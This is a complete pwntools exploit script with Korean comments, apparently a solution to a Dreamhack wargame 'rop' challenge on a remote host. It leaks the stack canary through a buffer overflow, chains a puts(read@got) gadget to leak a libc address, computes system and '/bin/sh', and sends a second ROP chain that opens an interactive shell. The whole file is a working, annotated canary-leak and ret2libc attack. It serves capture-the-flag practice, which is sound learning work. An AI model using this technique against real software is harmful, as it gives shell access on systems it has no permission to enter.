from pwn import *   

p = remote("host3.dreamhack.games", 9526)  
e = ELF("./rop")                            # rop 바이너리의 심볼/plt/got 정보 읽기
libc = ELF("./libc.so.6")                   # libc 파일의 함수 오프셋, "/bin/sh" 위치 정보 읽기

pop_rdi = 0x0000000000400853                # pop rdi ; ret 가젯 주소
ret = 0x0000000000400596                    # ret 가젯 주소

offset = b'A' * 0x39                        # canary leak을 위한 입력
p.sendafter(b'Buf: ', offset)               # 첫 번째 Buf: 에 A * 0x39 전송
p.recvuntil(offset)                         # 내가 보낸 A * 0x39가 다시 출력될 때까지 받음
cnry = u64(b'\x00' + p.recvn(7))            # canary의 앞 1바이트는 \x00 이라 가정하고 뒤 7바이트를 받아 8바이트 정수로 복원

payload = b'A' * 0x38                       # buf부터 canary 직전까지 채움
payload += p64(cnry)                        # leak한 canary를 원래 값 그대로 넣어서 stack smashing 방지
payload += b'B' * 0x8                       # saved rbp 자리 더미값
payload += p64(pop_rdi)                     # 다음 값을 rdi에 넣기 위한 가젯
payload += p64(e.got['read'])               # rdi = read@got, 즉 read 실제 주소가 저장된 GOT 엔트리 주소
payload += p64(e.plt['puts'])               # puts(read@got) 실행해서 read 실제 주소 leak
payload += p64(e.symbols['main'])           # leak 후 다시 main으로 돌아가서 입력 기회를 다시 얻음

p.sendafter(b'Buf: ', payload)              # 두 번째 Buf: 에 leak용 ROP payload 전송

leaked_read = u64(p.recvline().strip().ljust(8, b'\x00'))  # puts가 출력한 read 실제 주소를 받아 8바이트로 맞춘 뒤 정수로 변환
libc_base = leaked_read - libc.symbols['read']             # libc base = 실제 read 주소 - libc 안의 read 오프셋
system_addr = libc_base + libc.symbols['system']           # system 실제 주소 계산
binsh_addr = libc_base + next(libc.search(b'/bin/sh'))     # libc 안 "/bin/sh" 문자열의 실제 주소 계산

offset = b'A' * 0x39                        # main으로 다시 돌아왔으므로 canary를 다시 leak
p.sendafter(b'Buf: ', offset)               # 첫 번째 Buf: 에 다시 A * 0x39 전송
p.recvuntil(offset)                         # A * 0x39가 출력될 때까지 받음
cnry = u64(b'\x00' + p.recvn(7))            # canary를 다시 복원

payload = b'A' * 0x38                       # buf부터 canary 직전까지 채움
payload += p64(cnry)                        # canary 원래 값 복구
payload += b'B' * 0x8                       # saved rbp 자리 더미값
payload += p64(ret)                         # stack alignment 맞추기 위한 ret
payload += p64(pop_rdi)                     # 다음 값을 rdi에 넣기 위한 가젯
payload += p64(binsh_addr)                  # rdi = "/bin/sh" 주소
payload += p64(system_addr)                 # system("/bin/sh") 실행

p.sendafter(b'Buf: ', payload)              # 두 번째 Buf: 에 최종 ROP payload 전송
p.interactive()                             